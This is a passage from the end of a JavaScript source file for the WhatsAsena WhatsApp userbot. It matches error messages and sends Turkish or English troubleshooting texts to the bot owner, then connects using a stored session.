                                    return await WhatsAsenaCN.sendMessage(WhatsAsenaCN.user.jid, '*⚕️ HATA ÇÖZÜMLEME [WHATSASENA] ⚕️*' + 
                                        '\n========== ```Hata Okundu!``` ==========' +
                                        '\n\n*Ana Hata:* _No Such File or Directory_' +
                                        '\n*Nedeni:* _Pluginin yanlış kodlanması._' +
                                        '\n*Çözümü:* _Lütfen plugininin kodlarını kontrol edin._'
                                        , MessageType.text
                                    );
                                }
                                else if (error.message.includes('404')) {
                                    return await WhatsAsenaCN.sendMessage(WhatsAsenaCN.user.jid, '*⚕️ HATA ÇÖZÜMLEME [WHATSASENA] ⚕️*' + 
                                        '\n========== ```Hata Okundu!``` ==========' +
                                        '\n\n*Ana Hata:* _Error 404 HTTPS_' +
                                        '\n*Nedeni:* _Heroku plugini altındaki komutların kullanılması sonucu sunucu ile iletişime geçilememesi._' +
                                        '\n*Çözümü:* _Biraz bekleyip tekrar deneyin. Hala hata alıyorsanız internet sitesi üzerinden işlemi gerçekleştirin._'
                                        , MessageType.text
                                    );
                                }
                                else if (error.message.includes('reply.delete')) {
                                    return await WhatsAsenaCN.sendMessage(WhatsAsenaCN.user.jid, '*⚕️ HATA ÇÖZÜMLEME [WHATSASENA] ⚕️*' + 
                                        '\n========== ```Hata Okundu!``` ==========' +
                                        '\n\n*Ana Hata:* _Reply Delete Function_' +
                                        '\n*Nedeni:* _IMG yada Wiki komutlarının kullanılması._' +
                                        '\n*Çözümü:* _Bu hatanın çözümü yoktur. Önemli bir hata değildir._'
                                        , MessageType.text
                                    );
                                }
                                else if (error.message.includes('load.delete')) {
                                    return await WhatsAsenaCN.sendMessage(WhatsAsenaCN.user.jid, '*⚕️ HATA ÇÖZÜMLEME [WHATSASENA] ⚕️*' + 
                                        '\n========== ```Hata Okundu!``` ==========' +
                                        '\n\n*Ana Hata:* _Reply Delete Function_' +
                                        '\n*Nedeni:* _IMG yada Wiki komutlarının kullanılması._' +
                                        '\n*Çözümü:* _Bu hatanın çözümü yoktur. Önemli bir hata değildir._'
                                        , MessageType.text
                                    );
                                }
                                else if (error.message.includes('400')) {
                                    return await WhatsAsenaCN.sendMessage(WhatsAsenaCN.user.jid, '*⚕️ HATA ÇÖZÜMLEME [WHATSASENA] ⚕️*' + 
                                        '\n========== ```Hata Okundu!``` ==========' +
                                        '\n\n*Ana Hata:* _Bailyes Action Error_ ' +
                                        '\n*Nedeni:* _Tam nedeni bilinmiyor. Birden fazla seçenek bu hatayı tetiklemiş olabilir._' +
                                        '\n*Çözümü:* _Bir kez daha kullanırsanız düzelebilir. Hata devam ediyorsa restart atmayı deneyebilirsiniz._'
                                        , MessageType.text
                                    );
                                }
                                else if (error.message.includes('decode')) {
                                    return await WhatsAsenaCN.sendMessage(WhatsAsenaCN.user.jid, '*⚕️ HATA ÇÖZÜMLEME [WHATSASENA] ⚕️*' + 
                                        '\n========== ```Hata Okundu!``` ==========' +
                                        '\n\n*Ana Hata:* _Cannot Decode Text or Media_' +
                                        '\n*Nedeni:* _Pluginin yanlış kullanımı._' +
                                        '\n*Çözümü:* _Lütfen komutları plugin açıklamasında yazdığı gibi kullanın._'
                                        , MessageType.text
                                    );
                                }
                                else if (error.message.includes('unescaped')) {
                                    return await WhatsAsenaCN.sendMessage(WhatsAsenaCN.user.jid, '*⚕️ HATA ÇÖZÜMLEME [WHATSASENA] ⚕️*' + 
                                        '\n========== ```Hata Okundu!``` ==========' +
                                        '\n\n*Ana Hata:* _Word Character Usage_' +
                                        '\n*Nedeni:* _TTP, ATTP gibi komutların latin alfabesi dışında kullanılması._' +
                                        '\n*Çözümü:* _Komutu latif alfabesi çerçevesinde kullanırsanız sorun çözülecektir._'
                                        , MessageType.text
                                    );
                                }
                                else if (error.message.includes('conversation')) {
                                    return await WhatsAsenaCN.sendMessage(WhatsAsenaCN.user.jid, '*⚕️ HATA ÇÖZÜMLEME [WHATSASENA] ⚕️*' + 
                                        '\n========== ```Hata Okundu!``` ==========' +
                                        '\n\n*Ana Hata:* _Deleting Plugin_' +
                                        '\n*Nedeni:* _Silinmek istenen plugin isminin yanlış girilmesi._' +
                                        '\n*Çözümü:* _Lütfen silmek istediğiniz pluginin başına_ *__* _koymadan deneyin. Hala hata alıyorsanız ismin sonundaki_ ```?(.*) / $``` _gibi ifadeleri eksiksiz girin._'
                                        , MessageType.text
                                    );
                                }
                                else {
                                    return await WhatsAsenaCN.sendMessage(WhatsAsenaCN.user.jid, '*🙇🏻 Maalesef Bu Hatayı Okuyamadım! 🙇🏻*' +
                                        '\n_Daha fazla yardım için grubumuza yazabilirsiniz._'
                                        , MessageType.text
                                    );
                                }
                            }
                            else {
                               
                                if (error.message.includes('URL')) {
                                    return await WhatsAsenaCN.sendMessage(WhatsAsenaCN.user.jid, '*⚕️ ERROR ANALYSIS [WHATSASENA] ⚕️*' + 
                                        '\n========== ```Error Resolved!``` ==========' +
                                        '\n\n*Main Error:* _Only Absolutely URLs Supported_' +
                                        '\n*Reason:* _The usage of media tools (xmedia, sticker..) in the LOG number._' +
                                        '\n*Solution:* _You can use commands in any chat, except the LOG number._'
                                        , MessageType.text
                                    );
                                }
                                else if (error.message.includes('conversation')) {
                                    return await WhatsAsenaCN.sendMessage(WhatsAsenaCN.user.jid, '*⚕️ ERROR ANALYSIS [WHATSASENA] ⚕️*' + 
                                        '\n========== ```Error Resolved!``` ==========' +
                                        '\n\n*Main Error:* _Deleting Plugin_' +
                                        '\n*Reason:* _Entering incorrectly the name of the plugin wanted to be deleted._' +
                                        '\n*Solution:* _Please try without adding_ *__* _to the plugin you want to delete. If you still get an error, try to add like_ ```?(.*) / $``` _to the end of the name._ '
                                        , MessageType.text
                                    );
                                }
                                else if (error.message.includes('split')) {
                                    return await WhatsAsenaCN.sendMessage(WhatsAsenaCN.user.jid, '*⚕️ ERROR ANALYSIS [WHATSASENA] ⚕️*' + 
                                        '\n========== ```Error Resolved!``` ==========' +
                                        '\n\n*Main Error:* _Split of Undefined_' +
                                        '\n*Reason:* _Commands that can be used by group admins occasionally dont see the split function._ ' +
                                        '\n*Solution:* _Restarting will be enough._'
                                        , MessageType.text
                                    );
                                }
                                else if (error.message.includes('SSL')) {
                                    return await WhatsAsenaCN.sendMessage(WhatsAsenaCN.user.jid, '*⚕️ ERROR ANALYSIS [WHATSASENA] ⚕️*' + 
                                        '\n========== ```Error Resolved!``` ==========' +
                                        '\n\n*Main Error:* _SQL Database Error_' +
                                        '\n*Reason:* _Database corruption._ ' +
                                        '\n*Solution:* _There is no known solution. You can try reinstalling it._'
                                        , MessageType.text
                                    );
                                }
                                else if (error.message.includes('Ookla')) {
                                    return await WhatsAsenaCN.sendMessage(WhatsAsenaCN.user.jid, '*⚕️ ERROR ANALYSIS [WHATSASENA] ⚕️*' + 
                                        '\n========== ```Error Resolved!``` ==========' +
                                        '\n\n*Main Error:* _Ookla Server Connection_' +
                                        '\n*Reason:* _Speedtest data cannot be transmitted to the server._' +
                                        '\n*Solution:* _If you use it one more time the problem will be solved._'
                                        , MessageType.text
                                    );
                                }
                                else if (error.message.includes('params')) {
                                    return await WhatsAsenaCN.sendMessage(WhatsAsenaCN.user.jid, '*⚕️ ERROR ANALYSIS [WHATSASENA] ⚕️*' + 
                                        '\n========== ```Error Resolved!``` ==========' +
                                        '\n\n*Main Error:* _Requested Audio Params_' +
                                        '\n*Reason:* _Using the TTS command outside the Latin alphabet._' +
                                        '\n*Solution:* _The problem will be solved if you use the command in Latin letters frame._'
                                        , MessageType.text
                                    );
                                }
                                else if (error.message.includes('unlink')) {
                                    return await WhatsAsenaCN.sendMessage(WhatsAsenaCN.user.jid, '*⚕️ ERROR ANALYSIS [WHATSASENA] ⚕️*' + 
                                        '\n========== ```Error Resolved``` ==========' +
                                        '\n\n*Main Error:* _No Such File or Directory_' +
                                        '\n*Reason:* _Incorrect coding of the plugin._' +
                                        '\n*Solution:* _Please check the your plugin codes._'
                                        , MessageType.text
                                    );
                                }
                                else if (error.message.includes('404')) {
                                    return await WhatsAsenaCN.sendMessage(WhatsAsenaCN.user.jid, '*⚕️ ERROR ANALYSIS [WHATSASENA] ⚕️*' + 
                                        '\n========== ```Error Resolved!``` ==========' +
                                        '\n\n*Main Error:* _Error 404 HTTPS_' +
                                        '\n*Reason:* _Failure to communicate with the server as a result of using the commands under the Heroku plugin._' +
                                        '\n*Solution:* _Wait a while and try again. If you still get the error, perform the transaction on the website.._'
                                        , MessageType.text
                                    );
                                }
                                else if (error.message.includes('reply.delete')) {
                                    return await WhatsAsenaCN.sendMessage(WhatsAsenaCN.user.jid, '*⚕️ ERROR ANALYSIS [WHATSASENA] ⚕️*' + 
                                        '\n========== ```Error Resolved!``` ==========' +
                                        '\n\n*Main Error:* _Reply Delete Function_' +
                                        '\n*Reason:* _Using IMG or Wiki commands._' +
                                        '\n*Solution:* _There is no solution for this error. It is not a fatal error._'
                                        , MessageType.text
                                    );
                                }
                                else if (error.message.includes('load.delete')) {
                                    return await WhatsAsenaCN.sendMessage(WhatsAsenaCN.user.jid, '*⚕️ ERROR ANALYSIS [WHATSASENA] ⚕️*' + 
                                        '\n========== ```Error Resolved!``` ==========' +
                                        '\n\n*Main Error:* _Reply Delete Function_' +
                                        '\n*Reason:* _Using IMG or Wiki commands._' +
                                        '\n*Solution:* _There is no solution for this error. It is not a fatal error._'
                                        , MessageType.text
                                    );
                                }
                                else if (error.message.includes('400')) {
                                    return await WhatsAsenaCN.sendMessage(WhatsAsenaCN.user.jid, '*⚕️ ERROR ANALYSIS [WHATSASENA] ⚕️*' + 
                                        '\n========== ```Error Resolved!``` ==========' +
                                        '\n\n*Main Error:* _Bailyes Action Error_ ' +
                                        '\n*Reason:* _The exact reason is unknown. More than one option may have triggered this error._' +
                                        '\n*Solution:* _If you use it again, it may improve. If the error continues, you can try to restart._'
                                        , MessageType.text
                                    );
                                }
                                else if (error.message.includes('decode')) {
                                    return await WhatsAsenaCN.sendMessage(WhatsAsenaCN.user.jid, '*⚕️ ERROR ANALYSIS [WHATSASENA] ⚕️*' + 
                                        '\n========== ```Error Resolved!``` ==========' +
                                        '\n\n*Main Error:* _Cannot Decode Text or Media_' +
                                        '\n*Reason:* _Incorrect use of the plug._' +
                                        '\n*Solution:* _Please use the commands as written in the plugin description._'
                                        , MessageType.text
                                    );
                                }
                                else if (error.message.includes('unescaped')) {
                                    return await WhatsAsenaCN.sendMessage(WhatsAsenaCN.user.jid, '*⚕️ ERROR ANALYSIS [WHATSASENA] ⚕️*' + 
                                        '\n========== ```Error Resolved!``` ==========' +
                                        '\n\n*Main Error:* _Word Character Usage_' +
                                        '\n*Reason:* _Using commands such as TTP, ATTP outside the Latin alphabet._' +
                                        '\n*Solution:* _The problem will be solved if you use the command in Latin alphabet.._'
                                        , MessageType.text
                                    );
                                }
                                else {
                                    return await WhatsAsenaCN.sendMessage(WhatsAsenaCN.user.jid, '*🙇🏻 Sorry, I Couldnt Read This Error! 🙇🏻*' +
                                        '\n_You can write to our support group for more help._'
                                        , MessageType.text
                                    );
                                }    
                            }
                        }
                    }
                }
            }
        )
    });
    // ==================== End Error Message ====================

    try {
        await WhatsAsenaCN.connect();
    } catch {
        if (!nodb) {
            console.log(chalk.red.bold('Loading Old Version Session...'))
            WhatsAsenaCN.loadAuthInfo(Session.deCrypt(config.SESSION)); 
            try {
                await WhatsAsenaCN.connect();
            } catch {
                return;
            }
        }
    }
}

whatsAsena();
